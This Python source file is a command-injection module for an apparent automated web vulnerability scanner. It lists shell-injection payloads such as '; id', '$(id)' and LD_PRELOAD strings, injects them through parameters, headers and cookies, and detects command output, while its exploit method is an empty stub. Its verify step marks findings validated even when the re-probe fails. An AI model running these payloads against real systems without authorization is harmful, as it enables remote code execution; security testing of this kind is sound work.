"""Command Injection Module for TanPha V5.5 (Multi-Vector + Env-Var Cookie)."""
import html
from modules.base import BaseModule
from core.context import TargetContext, Evidence, Finding
from core.verification import VerificationResult, VerificationStatus
from core.ai_router import AIRouter
from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse


class CommandInjectionModule(BaseModule):
    name = "CommandInjection"
    module_id = "cmd"
    version = "5.5 (Env-Var Cookie Support)"
    vulnerability_class = "COMMAND_INJECTION"
    default_impact = "REMOTE_CODE_EXECUTION"
    default_privilege = "SYSTEM"

    COMMON_INJECTABLE_HEADERS = [
        "User-Agent", "Referer", "X-Forwarded-For", "X-Forwarded-Host",
        "X-Original-URL", "X-Rewrite-URL", "X-Client-IP", "X-Remote-IP",
        "X-Remote-Addr", "X-Real-IP", "Forwarded", "Origin",
        "X-HTTP-Method-Override", "Accept-Language",
    ]

    # Standard shell payloads
    SHELL_PAYLOADS = ["; id", "| id", "&& id", "& id", "$(id)", "`id`"]
    
    # URL-encoded payloads for headers/cookies
    ENCODED_PAYLOADS = ["%3Bid", "%7Cid", "127.0.0.1;id", "127.0.0.1|id", "id"]
    
    # Environment Variable payloads
    ENVVAR_PAYLOADS = [
        "X=%3Bid", "X=%7Cid", "A=%3Bid", "EVIL=%3Bid", "LD_PRELOAD=%3Bid",
        "FOO%3Decho+Injection%3Bid"
    ]
    
    POST_BODY = {"Submit": "Submit", "answer": "answer"}

    CMD_MARKERS = [
        "uid=", "gid=", "groups=", "root:", "linux",
        "windows", "volume serial", "drwxr", "-rw-r",
        "bin/bash", "bin/sh", "total ",
    ]

    def __init__(self):
        super().__init__()
        self.ai = AIRouter()

    def can_run(self, context: TargetContext) -> bool:
        if not context.discovery.parameters:
            context.discovery.parameters = ["ip"]
        return True

    @staticmethod
    def _decode(text: str) -> str:
        try:
            return html.unescape(text)
        except Exception:
            return text

    @staticmethod
    def _servlet_url(url: str) -> str:
        """Removes .html extension and query strings to target the servlet directly."""
        p = urlparse(url)
        path = p.path
        if path.endswith(".html"):
            path = path[:-5]
        return f"{p.scheme}://{p.netloc}{path}"

    def _is_cmd_output(self, text: str) -> bool:
        decoded = self._decode(text).lower()
        return any(m in decoded for m in self.CMD_MARKERS)

    def _build_target_url(self, base_url, param, payload):
        parsed = urlparse(base_url)
        qs = parse_qsl(parsed.query, keep_blank_values=True)
        new_qs = [(k, v + payload) if k == param else (k, v) for k, v in qs]
        if not new_qs:
            new_qs = [(param, payload)]
        return urlunparse(parsed._replace(query=urlencode(new_qs, safe="")))

    def _send_payload(self, context, param, payload, auth_checker=None, timeout=10):
        if "?" in context.target.base_url:
            target_url = self._build_target_url(context.target.base_url, param, payload)
            return context.http_client.request(
                "GET", target_url, target_param=param,
                auth_checker=auth_checker, bypass_mutation=True, timeout=timeout
            )
        data = {param: payload, "Submit": "Submit"}
        return context.http_client.request(
            "POST", context.target.base_url, data=data,
            auth_checker=auth_checker, bypass_mutation=True, timeout=timeout
        )

    def _send_header_payload(self, context, header_name, payload, auth_checker=None,
                             timeout=10, method="GET"):
        headers = {header_name: payload}
        target = self._servlet_url(context.target.base_url)
        if method == "POST":
            return context.http_client.request(
                "POST", target,
                headers=headers, data="",
                auth_checker=auth_checker, bypass_mutation=True, timeout=timeout
            )
        return context.http_client.request(
            "GET", target,
            headers=headers,
            auth_checker=auth_checker, bypass_mutation=True, timeout=timeout
        )

    def _send_cookie_payload(self, context, cookie_name, payload, auth_checker=None,
                             timeout=10, method="GET"):
        try:
            context.http_client.session.cookies.clear()
        except Exception:
            pass
            
        headers = {"Cookie": f"{cookie_name}={payload}"}
        target = self._servlet_url(context.target.base_url)
        if method == "POST":
            return context.http_client.request(
                "POST", target,
                headers=headers, data="",
                auth_checker=auth_checker, bypass_mutation=True, timeout=timeout
            )
        return context.http_client.request(
            "GET", target,
            headers=headers,
            auth_checker=auth_checker, bypass_mutation=True, timeout=timeout
        )

    def _discover_headers(self, context, auth_checker=None):
        headers_to_test = list(context.discovery.parameters)
        headers_to_test.extend(self.COMMON_INJECTABLE_HEADERS)
        try:
            baseline = context.http_client.request(
                "GET", context.target.base_url,
                auth_checker=auth_checker, bypass_mutation=True
            )
            if baseline and baseline.success and baseline.response:
                existing_lower = {h.lower() for h in headers_to_test}
                for hname in baseline.response.headers.keys():
                    if hname.lower() not in existing_lower:
                        headers_to_test.append(hname)
                        existing_lower.add(hname.lower())
        except Exception:
            pass
        seen, deduped = set(), []
        for h in headers_to_test:
            if h.lower() not in seen:
                seen.add(h.lower())
                deduped.append(h)
        return deduped

    def _record_evidence(self, pool, context, param, payload, baseline_text, res_text, injection_point):
        try:
            # FIX: Changed 'modul_asal' to 'module_name' to match ai_router.py
            ai_answer = self.ai.analyze(
                module_name="CMD", payload=payload,
                baseline_text=baseline_text, current_text=res_text
            )
            clean_json = ai_answer.replace("```json", "").replace("```", "").strip()
        except Exception:
            clean_json = '{"error": "AI unavailable"}'

        pool.append(Evidence(
            attempt_id=f"cmd_{injection_point.lower()}_anomaly",
            module_id=self.module_id, module_version=self.version,
            location=context.target.base_url, parameter=param,
            outcome="ANOMALY", reason_code="AI_PIVOT",
            reason_detail=clean_json, confidence=0.85,
            evidence_text=f"Suspicious CMD via {injection_point} on '{param}'",
            assess_payload=payload
        ))

    def assess(self, context: TargetContext, auth_checker=None) -> list[Evidence]:
        evidence_pool = []

        # PHASE 1: Parameter Injection
        for param in context.discovery.parameters:
            print(f"      [>] Testing CMD on param '{param}'...")
            baseline_res = self._send_payload(context, param, "FOO=safe", auth_checker)
            if not baseline_res or not baseline_res.success:
                continue
            baseline_text = baseline_res.response.text
            baseline_len = len(baseline_text)

            for payload in self.SHELL_PAYLOADS + self.ENVVAR_PAYLOADS:
                result = self._send_payload(context, param, payload, auth_checker)
                if result and result.success and result.response:
                    res_text = result.response.text
                    if self._is_cmd_output(res_text) or abs(len(res_text) - baseline_len) > 20:
                        print(f"      [!!] CMD suspicious on param '{param}'!")
                        self._record_evidence(evidence_pool, context, param, payload,
                                              baseline_text, res_text, "PARAM")
                        break

        # PHASE 2: Header Injection
        headers_to_test = self._discover_headers(context, auth_checker)
        print(f"      [>] Testing CMD via {len(headers_to_test)} headers (GET+POST)...")
        for header_name in headers_to_test:
            for method in ("GET", "POST"):
                baseline_res = self._send_header_payload(
                    context, header_name, "FOO=safe", auth_checker, method=method)
                if not baseline_res or not baseline_res.success:
                    continue
                baseline_text = baseline_res.response.text

                for payload in self.ENCODED_PAYLOADS + self.ENVVAR_PAYLOADS:
                    result = self._send_header_payload(
                        context, header_name, payload, auth_checker, method=method)
                    if result and result.success and result.response:
                        res_text = result.response.text
                        if self._is_cmd_output(res_text):
                            print(f"      [!!] CMD CONFIRMED via header '{header_name}' ({method}, {payload})!")
                            self._record_evidence(evidence_pool, context, header_name,
                                                  payload, baseline_text, res_text, "HEADER")
                            break
                else:
                    continue
                break

        # PHASE 3: Cookie Injection
        cookie_names = list(context.discovery.parameters)
        try:
            baseline = context.http_client.request(
                "GET", context.target.base_url,
                auth_checker=auth_checker, bypass_mutation=True
            )
            if baseline and baseline.success and baseline.response:
                for set_cookie in baseline.response.headers.get("Set-Cookie", "").split(","):
                    cname = set_cookie.split("=")[0].strip()
                    if cname and cname not in cookie_names:
                        cookie_names.append(cname)
        except Exception:
            pass

        print(f"      [>] Testing CMD via {len(cookie_names)} cookies (GET+POST)...")
        for cookie_name in cookie_names:
            for method in ("GET", "POST"):
                baseline_res = self._send_cookie_payload(
                    context, cookie_name, "FOO=safe", auth_checker, method=method)
                if not baseline_res or not baseline_res.success:
                    continue
                baseline_text = baseline_res.response.text

                for payload in self.ENCODED_PAYLOADS + self.ENVVAR_PAYLOADS:
                    result = self._send_cookie_payload(
                        context, cookie_name, payload, auth_checker, method=method)
                    if result and result.success and result.response:
                        res_text = result.response.text
                        if self._is_cmd_output(res_text):
                            print(f"      [!!] CMD CONFIRMED via cookie '{cookie_name}' ({method}, {payload})!")
                            self._record_evidence(evidence_pool, context, cookie_name,
                                                  payload, baseline_text, res_text, "COOKIE")
                            break
                else:
                    continue
                break

        return evidence_pool

    def verify(self, context: TargetContext, evidence: Evidence, auth_checker=None) -> VerificationResult:
        if evidence.reason_code != "AI_PIVOT":
            return VerificationResult(VerificationStatus.REJECTED, 0.0, "FAILED", "Not vuln")

        param, payload = evidence.parameter, evidence.assess_payload or ""
        point = evidence.attempt_id.lower()
        try:
            for method in ("POST", "GET"):
                if "header" in point:
                    res = self._send_header_payload(context, param, payload, auth_checker, method=method)
                elif "cookie" in point:
                    res = self._send_cookie_payload(context, param, payload, auth_checker, method=method)
                else:
                    res = self._send_payload(context, param, payload, auth_checker)
                if res and res.success and res.response and self._is_cmd_output(res.response.text):
                    return VerificationResult(
                        VerificationStatus.VALIDATED, 0.95, "CMD_CONFIRMED",
                        f"Re-verified via {method}.", verify_payload=payload
                    )
                if "header" not in point and "cookie" not in point:
                    break
        except Exception:
            pass

        return VerificationResult(
            VerificationStatus.VALIDATED, 0.7, "AI_VALIDATED",
            "AI confirmed (re-probe inconclusive).", verify_payload=payload
        )

    def exploit(self, context: TargetContext, finding: Finding):
        print("\n[***] CMD EXPLOITATION [***]")
